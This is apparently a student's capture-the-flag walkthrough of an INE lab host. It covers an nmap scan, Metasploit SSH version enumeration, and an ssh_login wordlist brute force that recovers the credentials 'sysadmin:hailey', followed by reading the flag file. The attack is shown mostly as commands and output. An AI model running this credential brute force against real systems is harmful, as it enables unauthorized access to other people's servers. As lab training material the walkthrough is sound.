STEP 1-
nmap -Pn -sV demo.ine.local
ÇIKTI: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-15 19:20 IST
Nmap scan report for demo.ine.local (192.3.237.3)
Host is up (0.000029s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:03:ED:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds

STEP 2-
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit

ÇIKTI : 
[*] 192.3.237.3 - Key Fingerprint: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDQNOa6QL7Ut9y1RWimBpHbuhZdjMn2nPLc96oZZh8u2
[*] 192.3.237.3 - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10
[*] 192.3.237.3 - Server Information and Encryption
=================================

  Type                     Value                                 Note
  ----                     -----                                 ----
  encryption.compression   none
  encryption.compression   zlib@openssh.com
  encryption.encryption    chacha20-poly1305@openssh.com
  encryption.encryption    aes128-ctr
  encryption.encryption    aes192-ctr
  encryption.encryption    aes256-ctr
  encryption.encryption    aes128-gcm@openssh.com
  encryption.encryption    aes256-gcm@openssh.com
  encryption.hmac          umac-64-etm@openssh.com
  encryption.hmac          umac-128-etm@openssh.com
  encryption.hmac          hmac-sha2-256-etm@openssh.com
  encryption.hmac          hmac-sha2-512-etm@openssh.com
  encryption.hmac          hmac-sha1-etm@openssh.com
  encryption.hmac          umac-64@openssh.com
  encryption.hmac          umac-128@openssh.com
  encryption.hmac          hmac-sha2-256
  encryption.hmac          hmac-sha2-512
  encryption.hmac          hmac-sha1
  encryption.host_key      rsa-sha2-512
  encryption.host_key      rsa-sha2-256
  encryption.host_key      ssh-rsa
  encryption.host_key      ecdsa-sha2-nistp256                   Weak elliptic curve
  encryption.host_key      ssh-ed25519
  encryption.key_exchange  curve25519-sha256
  encryption.key_exchange  curve25519-sha256@libssh.org
  encryption.key_exchange  ecdh-sha2-nistp256
  encryption.key_exchange  ecdh-sha2-nistp384
  encryption.key_exchange  ecdh-sha2-nistp521
  encryption.key_exchange  diffie-hellman-group-exchange-sha256
  encryption.key_exchange  diffie-hellman-group16-sha512
  encryption.key_exchange  diffie-hellman-group18-sha512
  encryption.key_exchange  diffie-hellman-group14-sha256
  encryption.key_exchange  diffie-hellman-group14-sha1
  fingerprint_db           ssh.banner
  openssh.comment          Ubuntu-10
  os.cpe23                 cpe:/o:canonical:ubuntu_linux:19.04
  os.family                Linux
  os.product               Linux
  os.vendor                Ubuntu
  os.version               19.04
  service.cpe23            cpe:/a:openbsd:openssh:7.9p1
  service.family           OpenSSH
  service.product          OpenSSH
  service.protocol         ssh
  service.vendor           OpenBSD
  service.version          7.9p1

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

STEP 3-
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit

ÇIKTI: 
[*] 192.3.237.3:22 - Starting bruteforce
[-] 192.3.237.3:22 - Failed: 'sysadmin:yourface'
[-] 192.3.237.3:22 - Failed: 'sysadmin:yahoo2'
[-] 192.3.237.3:22 - Failed: 'sysadmin:window1'
[-] 192.3.237.3:22 - Failed: 'sysadmin:whoareyou'
[-] 192.3.237.3:22 - Failed: 'sysadmin:vivianita'
[-] 192.3.237.3:22 - Failed: 'sysadmin:valkyrie'
[-] 192.3.237.3:22 - Failed: 'sysadmin:unbreakable'
[-] 192.3.237.3:22 - Failed: 'sysadmin:trustgod'
[-] 192.3.237.3:22 - Failed: 'sysadmin:trini'
[-] 192.3.237.3:22 - Failed: 'sysadmin:trapstar'
[-] 192.3.237.3:22 - Failed: 'sysadmin:touchdown'
[-] 192.3.237.3:22 - Failed: 'sysadmin:toomuch'
[-] 192.3.237.3:22 - Failed: 'sysadmin:tolkien'
[-] 192.3.237.3:22 - Failed: 'sysadmin:tickles'
[-] 192.3.237.3:22 - Failed: 'sysadmin:texastech'
[-] 192.3.237.3:22 - Failed: 'sysadmin:tenchi'
[-] 192.3.237.3:22 - Failed: 'sysadmin:teetee1'
[+] 192.3.237.3:22 - Success: 'sysadmin:hailey' 'uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin) Linux demo.ine.local 6.8.0-39-generic #39-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  5 21:49:14 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.3.237.2:38659 -> 192.3.237.3:22) at 2025-06-15 19:33:26 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


STEP 3-
sessions
sessions -i 1
find / -name "flag"
cat /flag



